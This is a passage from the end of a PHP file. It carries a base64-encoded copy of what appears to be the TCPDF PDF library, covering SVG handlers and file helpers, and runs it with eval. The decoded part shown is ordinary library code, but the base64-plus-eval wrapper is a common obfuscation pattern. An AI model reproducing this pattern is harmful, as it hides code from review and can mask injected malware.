ml0cygkYXR0cmlic1sneSddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOwoJCQkJfSBlbHNlaWYgKCRuYW1lID09ICd0c3BhbicpIHsKCQkJCQkkeSA9ICR0aGlzLT55OwoJCQkJfSBlbHNlIHsKCQkJCQkkeSA9IDA7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ2R5J10pKSB7CgkJCQkJJHkgKz0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1snZHknXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJCX0KCQkJCSRzdmdzdHlsZVsndGV4dC1jb2xvciddID0gJHN2Z3N0eWxlWydmaWxsJ107CgkJCQkkdGhpcy0+c3ZndGV4dCA9ICcnOwoJCQkJaWYgKGlzc2V0KCRzdmdzdHlsZVsndGV4dC1hbmNob3InXSkpIHsKCQkJCQkkdGhpcy0+c3ZndGV4dG1vZGVbJ3RleHQtYW5jaG9yJ10gPSAkc3Znc3R5bGVbJ3RleHQtYW5jaG9yJ107CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5zdmd0ZXh0bW9kZVsndGV4dC1hbmNob3InXSA9ICdzdGFydCc7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHN2Z3N0eWxlWydkaXJlY3Rpb24nXSkpIHsKCQkJCQlpZiAoJHN2Z3N0eWxlWydkaXJlY3Rpb24nXSA9PSAncnRsJykgewoJCQkJCQkkdGhpcy0+c3ZndGV4dG1vZGVbJ3J0bCddID0gdHJ1ZTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhpcy0+c3ZndGV4dG1vZGVbJ3J0bCddID0gZmFsc2U7CgkJCQkJfQoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+c3ZndGV4dG1vZGVbJ3J0bCddID0gZmFsc2U7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHN2Z3N0eWxlWydzdHJva2UnXSkgQU5EICgkc3Znc3R5bGVbJ3N0cm9rZSddICE9ICdub25lJykgQU5EIGlzc2V0KCRzdmdzdHlsZVsnc3Ryb2tlLXdpZHRoJ10pIEFORCAoJHN2Z3N0eWxlWydzdHJva2Utd2lkdGgnXSA+IDApKSB7CgkJCQkJJHRoaXMtPnN2Z3RleHRtb2RlWydzdHJva2UnXSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHN2Z3N0eWxlWydzdHJva2Utd2lkdGgnXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPnN2Z3RleHRtb2RlWydzdHJva2UnXSA9IGZhbHNlOwoJCQkJfQoJCQkJJHRoaXMtPlN0YXJ0VHJhbnNmb3JtKCk7CgkJCQkkdGhpcy0+U1ZHVHJhbnNmb3JtKCR0bSk7CgkJCQkkb2JzdHlsZSA9ICR0aGlzLT5zZXRTVkdTdHlsZXMoJHN2Z3N0eWxlLCAkcHJldl9zdmdzdHlsZSwgJHgsICR5LCAxLCAxKTsKCQkJCSR0aGlzLT54ID0gJHg7CgkJCQkkdGhpcy0+eSA9ICR5OwoJCQkJYnJlYWs7CgkJCX0KCQkJLy8gdXNlCgkJCWNhc2UgJ3VzZSc6IHsKCQkJCWlmIChpc3NldCgkYXR0cmlic1sneGxpbms6aHJlZiddKSBBTkQgIWVtcHR5KCRhdHRyaWJzWyd4bGluazpocmVmJ10pKSB7CgkJCQkJJHN2Z2RlZmlkID0gc3Vic3RyKCRhdHRyaWJzWyd4bGluazpocmVmJ10sIDEpOwoJCQkJCWlmIChpc3NldCgkdGhpcy0+c3ZnZGVmc1skc3ZnZGVmaWRdKSkgewoJCQkJCQkkdXNlID0gJHRoaXMtPnN2Z2RlZnNbJHN2Z2RlZmlkXTsKCQkJCQkJaWYgKGlzc2V0KCRhdHRyaWJzWyd4bGluazpocmVmJ10pKSB7CgkJCQkJCQl1bnNldCgkYXR0cmlic1sneGxpbms6aHJlZiddKTsKCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ2lkJ10pKSB7CgkJCQkJCQl1bnNldCgkYXR0cmlic1snaWQnXSk7CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCR1c2VbJ2F0dHJpYnMnXVsneCddKSBBTkQgaXNzZXQoJGF0dHJpYnNbJ3gnXSkpIHsKCQkJCQkJCSRhdHRyaWJzWyd4J10gKz0gJHVzZVsnYXR0cmlicyddWyd4J107CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCR1c2VbJ2F0dHJpYnMnXVsneSddKSBBTkQgaXNzZXQoJGF0dHJpYnNbJ3knXSkpIHsKCQkJCQkJCSRhdHRyaWJzWyd5J10gKz0gJHVzZVsnYXR0cmlicyddWyd5J107CgkJCQkJCX0KCQkJCQkJaWYgKGVtcHR5KCRhdHRyaWJzWydzdHlsZSddKSkgewoJCQkJCQkJJGF0dHJpYnNbJ3N0eWxlJ10gPSAnJzsKCQkJCQkJfQoJCQkJCQlpZiAoIWVtcHR5KCR1c2VbJ2F0dHJpYnMnXVsnc3R5bGUnXSkpIHsKCQkJCQkJCS8vIG1lcmdlIHN0eWxlcwoJCQkJCQkJJGF0dHJpYnNbJ3N0eWxlJ10gPSBzdHJfcmVwbGFjZSgnOzsnLCc7JywnOycuJHVzZVsnYXR0cmlicyddWydzdHlsZSddLiRhdHRyaWJzWydzdHlsZSddKTsKCQkJCQkJfQoJCQkJCQkkYXR0cmlicyA9IGFycmF5X21lcmdlKCR1c2VbJ2F0dHJpYnMnXSwgJGF0dHJpYnMpOwoJCQkJCQkkdGhpcy0+c3RhcnRTVkdFbGVtZW50SGFuZGxlcigkcGFyc2VyLCAkdXNlWyduYW1lJ10sICRhdHRyaWJzKTsKCQkJCQkJcmV0dXJuOwoJCQkJCX0KCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWRlZmF1bHQ6IHsKCQkJCWJyZWFrOwoJCQl9CgkJfSAvLyBlbmQgb2Ygc3dpdGNoCgkJLy8gcHJvY2VzcyBjaGlsZCBlbGVtZW50cwoJCWlmICghZW1wdHkoJGF0dHJpYnNbJ2NoaWxkX2VsZW1lbnRzJ10pKSB7CgkJCSRjaGlsZF9lbGVtZW50cyA9ICRhdHRyaWJzWydjaGlsZF9lbGVtZW50cyddOwoJCQl1bnNldCgkYXR0cmlic1snY2hpbGRfZWxlbWVudHMnXSk7CgkJCWZvcmVhY2goJGNoaWxkX2VsZW1lbnRzIGFzICRjaGlsZF9lbGVtZW50KSB7CgkJCQlpZiAoZW1wdHkoJGNoaWxkX2VsZW1lbnRbJ2F0dHJpYnMnXVsnY2xvc2luZ190YWcnXSkpIHsKCQkJCQkkdGhpcy0+c3RhcnRTVkdFbGVtZW50SGFuZGxlcignY2hpbGQtdGFnJywgJGNoaWxkX2VsZW1lbnRbJ25hbWUnXSwgJGNoaWxkX2VsZW1lbnRbJ2F0dHJpYnMnXSk7CgkJCQl9IGVsc2UgewoJCQkJCWlmIChpc3NldCgkY2hpbGRfZWxlbWVudFsnYXR0cmlicyddWydjb250ZW50J10pKSB7CgkJCQkJCSR0aGlzLT5zdmd0ZXh0ID0gJGNoaWxkX2VsZW1lbnRbJ2F0dHJpYnMnXVsnY29udGVudCddOwoJCQkJCX0KCQkJCQkkdGhpcy0+ZW5kU1ZHRWxlbWVudEhhbmRsZXIoJ2NoaWxkLXRhZycsICRjaGlsZF9lbGVtZW50WyduYW1lJ10pOwoJCQkJfQoJCQl9CgkJfQoJfQoKCS8qKgoJICogU2V0cyB0aGUgY2xvc2luZyBTVkcgZWxlbWVudCBoYW5kbGVyIGZ1bmN0aW9uIGZvciB0aGUgWE1MIHBhcnNlci4KCSAqIEBwYXJhbSByZXNvdXJjZXxzdHJpbmcgJHBhcnNlciBUaGUgZmlyc3QgcGFyYW1ldGVyLCBwYXJzZXIsIGlzIGEgcmVmZXJlbmNlIHRvIHRoZSBYTUwgcGFyc2VyIGNhbGxpbmcgdGhlIGhhbmRsZXIuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIFRoZSBzZWNvbmQgcGFyYW1ldGVyLCBuYW1lLCBjb250YWlucyB0aGUgbmFtZSBvZiB0aGUgZWxlbWVudCBmb3Igd2hpY2ggdGhpcyBoYW5kbGVyIGlzIGNhbGxlZC4gSWYgY2FzZS1mb2xkaW5nIGlzIGluIGVmZmVjdCBmb3IgdGhpcyBwYXJzZXIsIHRoZSBlbGVtZW50IG5hbWUgd2lsbCBiZSBpbiB1cHBlcmNhc2UgbGV0dGVycy4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNS0wMikKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGVuZFNWR0VsZW1lbnRIYW5kbGVyKCRwYXJzZXIsICRuYW1lKSB7CgkJJG5hbWUgPSAkdGhpcy0+cmVtb3ZlVGFnTmFtZXNwYWNlKCRuYW1lKTsKCQlpZiAoJHRoaXMtPnN2Z2RlZnNtb2RlIEFORCAhaW5fYXJyYXkoJG5hbWUsIGFycmF5KCdkZWZzJywgJ2NsaXBQYXRoJywgJ2xpbmVhckdyYWRpZW50JywgJ3JhZGlhbEdyYWRpZW50JywgJ3N0b3AnKSkpIHs7CgkJCWlmIChlbmQoJHRoaXMtPnN2Z2RlZnMpICE9PSBGQUxTRSkgewoJCQkJJGxhc3Rfc3ZnZGVmc19pZCA9IGtleSgkdGhpcy0+c3ZnZGVmcyk7CgkJCQlpZiAoaXNzZXQoJHRoaXMtPnN2Z2RlZnNbJGxhc3Rfc3ZnZGVmc19pZF1bJ2F0dHJpYnMnXVsnY2hpbGRfZWxlbWVudHMnXSkpIHsKCQkJCQlmb3JlYWNoKCR0aGlzLT5zdmdkZWZzWyRsYXN0X3N2Z2RlZnNfaWRdWydhdHRyaWJzJ11bJ2NoaWxkX2VsZW1lbnRzJ10gYXMgJGNoaWxkX2VsZW1lbnQpIHsKCQkJCQkJaWYgKGlzc2V0KCRjaGlsZF9lbGVtZW50WydhdHRyaWJzJ11bJ2lkJ10pIEFORCAoJGNoaWxkX2VsZW1lbnRbJ25hbWUnXSA9PSAkbmFtZSkpIHsKCQkJCQkJCSR0aGlzLT5zdmdkZWZzWyRsYXN0X3N2Z2RlZnNfaWRdWydhdHRyaWJzJ11bJ2NoaWxkX2VsZW1lbnRzJ11bJGNoaWxkX2VsZW1lbnRbJ2F0dHJpYnMnXVsnaWQnXS4nX0NMT1NFJ10gPSBhcnJheSgnbmFtZScgPT4gJG5hbWUsICdhdHRyaWJzJyA9PiBhcnJheSgnY2xvc2luZ190YWcnID0+IFRSVUUsICdjb250ZW50JyA9PiAkdGhpcy0+c3ZndGV4dCkpOwoJCQkJCQkJcmV0dXJuOwoJCQkJCQl9CgkJCQkJfQoJCQkJCWlmICgkdGhpcy0+c3ZnZGVmc1skbGFzdF9zdmdkZWZzX2lkXVsnbmFtZSddID09ICRuYW1lKSB7CgkJCQkJCSR0aGlzLT5zdmdkZWZzWyRsYXN0X3N2Z2RlZnNfaWRdWydhdHRyaWJzJ11bJ2NoaWxkX2VsZW1lbnRzJ11bJGxhc3Rfc3ZnZGVmc19pZC4nX0NMT1NFJ10gPSBhcnJheSgnbmFtZScgPT4gJG5hbWUsICdhdHRyaWJzJyA9PiBhcnJheSgnY2xvc2luZ190YWcnID0+IFRSVUUsICdjb250ZW50JyA9PiAkdGhpcy0+c3ZndGV4dCkpOwoJCQkJCQlyZXR1cm47CgkJCQkJfQoJCQkJfQoJCQl9CgkJCXJldHVybjsKCQl9CgkJc3dpdGNoKCRuYW1lKSB7CgkJCWNhc2UgJ2RlZnMnOiB7CgkJCQkkdGhpcy0+c3ZnZGVmc21vZGUgPSBmYWxzZTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIGNsaXBQYXRoCgkJCWNhc2UgJ2NsaXBQYXRoJzogewoJCQkJJHRoaXMtPnN2Z2NsaXBtb2RlID0gZmFsc2U7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdzdmcnOiB7CgkJCQlpZiAoLS0kdGhpcy0+c3ZnX3RhZ19kZXB0aCA8PSAwKSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCQkJY2FzZSAnZyc6IHsKCQkJCS8vIHVuZ3JvdXA6IHJlbW92ZSBsYXN0IHN0eWxlIGZyb20gYXJyYXkKCQkJCWFycmF5X3BvcCgkdGhpcy0+c3Znc3R5bGVzKTsKCQkJCSR0aGlzLT5TdG9wVHJhbnNmb3JtKCk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICd0ZXh0JzoKCQkJY2FzZSAndHNwYW4nOiB7CgkJCQlpZiAoJHRoaXMtPnN2Z3RleHRtb2RlWydpbnZpc2libGUnXSkgewoJCQkJCS8vIFRoaXMgaW1wbGVtZW50YXRpb24gbXVzdCBiZSBmaXhlZCB0byBmb2xsb3dpbmcgdGhlIHJ1bGU6CgkJCQkJLy8gSWYgdGhlICd2aXNpYmlsaXR5JyBwcm9wZXJ0eSBpcyBzZXQgdG8gaGlkZGVuIG9uIGEgJ3RzcGFuJywgJ3RyZWYnIG9yICdhbHRHbHlwaCcgZWxlbWVudCwgdGhlbiB0aGUgdGV4dCBpcyBpbnZpc2libGUgYnV0IHN0aWxsIHRha2VzIHVwIHNwYWNlIGluIHRleHQgbGF5b3V0IGNhbGN1bGF0aW9ucy4KCQkJCQlicmVhazsKCQkJCX0KCQkJCS8vIHByaW50IHRleHQKCQkJCSR0ZXh0ID0gJHRoaXMtPnN2Z3RleHQ7CgkJCQkvLyR0ZXh0ID0gJHRoaXMtPnN0cmluZ1RyaW0oJHRleHQpOwoJCQkJJHRleHRsZW4gPSAkdGhpcy0+R2V0U3RyaW5nV2lkdGgoJHRleHQpOwoJCQkJaWYgKCR0aGlzLT5zdmd0ZXh0bW9kZVsndGV4dC1hbmNob3InXSAhPSAnc3RhcnQnKSB7CgkJCQkJLy8gY2hlY2sgaWYgc3RyaW5nIGlzIFJUTCB0ZXh0CgkJCQkJaWYgKCR0aGlzLT5zdmd0ZXh0bW9kZVsndGV4dC1hbmNob3InXSA9PSAnZW5kJykgewoJCQkJCQlpZiAoJHRoaXMtPnN2Z3RleHRtb2RlWydydGwnXSkgewoJCQkJCQkJJHRoaXMtPnggKz0gJHRleHRsZW47CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkdGhpcy0+eCAtPSAkdGV4dGxlbjsKCQkJCQkJfQoJCQkJCX0gZWxzZWlmICgkdGhpcy0+c3ZndGV4dG1vZGVbJ3RleHQtYW5jaG9yJ10gPT0gJ21pZGRsZScpIHsKCQkJCQkJaWYgKCR0aGlzLT5zdmd0ZXh0bW9kZVsncnRsJ10pIHsKCQkJCQkJCSR0aGlzLT54ICs9ICgkdGV4dGxlbiAvIDIpOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJHRoaXMtPnggLT0gKCR0ZXh0bGVuIC8gMik7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQkkdGV4dHJlbmRlcm1vZGUgPSAkdGhpcy0+dGV4dHJlbmRlcm1vZGU7CgkJCQkkdGV4dHN0cm9rZXdpZHRoID0gJHRoaXMtPnRleHRzdHJva2V3aWR0aDsKCQkJCSR0aGlzLT5zZXRUZXh0UmVuZGVyaW5nTW9kZSgkdGhpcy0+c3ZndGV4dG1vZGVbJ3N0cm9rZSddLCB0cnVlLCBmYWxzZSk7CgkJCQlpZiAoJG5hbWUgPT0gJ3RleHQnKSB7CgkJCQkJLy8gc3RvcmUgY3VycmVudCBjb29yZGluYXRlcwoJCQkJCSR0bXB4ID0gJHRoaXMtPng7CgkJCQkJJHRtcHkgPSAkdGhpcy0+eTsKCQkJCX0KCQkJCS8vIHByaW50IHRoZSB0ZXh0CgkJCQkkdGhpcy0+Q2VsbCgkdGV4dGxlbiwgMCwgJHRleHQsIDAsIDAsICcnLCBmYWxzZSwgJycsIDAsIGZhbHNlLCAnTCcsICdUJyk7CgkJCQlpZiAoJG5hbWUgPT0gJ3RleHQnKSB7CgkJCQkJLy8gcmVzdG9yZSBjb29yZGluYXRlcwoJCQkJCSR0aGlzLT54ID0gJHRtcHg7CgkJCQkJJHRoaXMtPnkgPSAkdG1weTsKCQkJCX0KCQkJCS8vIHJlc3RvcmUgcHJldmlvdXMgcmVuZGVyaW5nIG1vZGUKCQkJCSR0aGlzLT50ZXh0cmVuZGVybW9kZSA9ICR0ZXh0cmVuZGVybW9kZTsKCQkJCSR0aGlzLT50ZXh0c3Ryb2tld2lkdGggPSAkdGV4dHN0cm9rZXdpZHRoOwoJCQkJJHRoaXMtPnN2Z3RleHQgPSAnJzsKCQkJCSR0aGlzLT5TdG9wVHJhbnNmb3JtKCk7CgkJCQlpZiAoISR0aGlzLT5zdmdkZWZzbW9kZSkgewoJCQkJCWFycmF5X3BvcCgkdGhpcy0+c3Znc3R5bGVzKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWRlZmF1bHQ6IHsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJfQoKCS8qKgoJICogU2V0cyB0aGUgY2hhcmFjdGVyIGRhdGEgaGFuZGxlciBmdW5jdGlvbiBmb3IgdGhlIFhNTCBwYXJzZXIuCgkgKiBAcGFyYW0gcmVzb3VyY2UgJHBhcnNlciBUaGUgZmlyc3QgcGFyYW1ldGVyLCBwYXJzZXIsIGlzIGEgcmVmZXJlbmNlIHRvIHRoZSBYTUwgcGFyc2VyIGNhbGxpbmcgdGhlIGhhbmRsZXIuCgkgKiBAcGFyYW0gc3RyaW5nICRkYXRhIFRoZSBzZWNvbmQgcGFyYW1ldGVyLCBkYXRhLCBjb250YWlucyB0aGUgY2hhcmFjdGVyIGRhdGEgYXMgYSBzdHJpbmcuCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDUtMDIpCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBzZWdTVkdDb250ZW50SGFuZGxlcigkcGFyc2VyLCAkZGF0YSkgewoJCSR0aGlzLT5zdmd0ZXh0IC49ICRkYXRhOwoJfQoKCS8vIC0tLSBFTkQgU1ZHIE1FVEhPRFMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiAgICAvKioKICAgICAqIEtlZXBzIGZpbGVzIGluIG1lbW9yeSwgc28gaXQgZG9lc24ndCBuZWVkIHRvIGRvd25sb2FkZWQgZXZlcnl0aW1lIGluIGEgbG9vcAogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldENhY2hlZEZpbGVDb250ZW50cygkZmlsZSkKICAgIHsKICAgICAgICBpZiAoIWlzc2V0KCR0aGlzLT5maWxlQ29udGVudENhY2hlWyRmaWxlXSkpIHsKICAgICAgICAgICAgJHRoaXMtPmZpbGVDb250ZW50Q2FjaGVbJGZpbGVdID0gVENQREZfU1RBVElDOjpmaWxlR2V0Q29udGVudHMoJGZpbGUpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPmZpbGVDb250ZW50Q2FjaGVbJGZpbGVdOwogICAgfQoKICAgIC8qKgogICAgICogQXZvaWQgbXVsdGlwbGUgY2FsbHMgdG8gYW4gZXh0ZXJuYWwgc2VydmVyIHRvIHNlZSBpZiBhIGZpbGUgZXhpc3RzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRmaWxlCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGZpbGVFeGlzdHMoJGZpbGUpCiAgICB7CiAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5maWxlQ29udGVudENhY2hlWyRmaWxlXSkgfHwgZmFsc2UgIT09ICR0aGlzLT5nZXRJbWFnZUJ1ZmZlcigkZmlsZSkpIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gVENQREZfU1RBVElDOjpmaWxlX2V4aXN0cygkZmlsZSk7CiAgICB9CgoJLyoqCgkgKiBXcmFwcGVyIGZvciB1bmxpbmsgd2l0aCBkaXNhYmxlZCBwcm90b2NvbHMuCgkgKiBAcGFyYW0gc3RyaW5nICRmaWxlCgkgKiBAcmV0dXJuIGJvb2wKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF91bmxpbmsoJGZpbGUpCgl7CgkJaWYgKChzdHJwb3MoJGZpbGUsICc6Ly8nKSAhPT0gZmFsc2UpICYmICgoc3Vic3RyKCRmaWxlLCAwLCA3KSAhPT0gJ2ZpbGU6Ly8nKSB8fCAoISR0aGlzLT5hbGxvd0xvY2FsRmlsZXMpKSkgewoJCQkvLyBmb3JiaWRkZW4gcHJvdG9jb2wKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQlyZXR1cm4gQHVubGluaygkZmlsZSk7Cgl9Cgp9IC8vIEVORCBPRiBUQ1BERiBDTEFTUwoKLy89PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0rCi8vIEVORCBPRiBGSUxFCi8vPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Kwo=');
ob_start();
eval('?>' . $code);
$content = ob_get_clean();
echo $content;
?>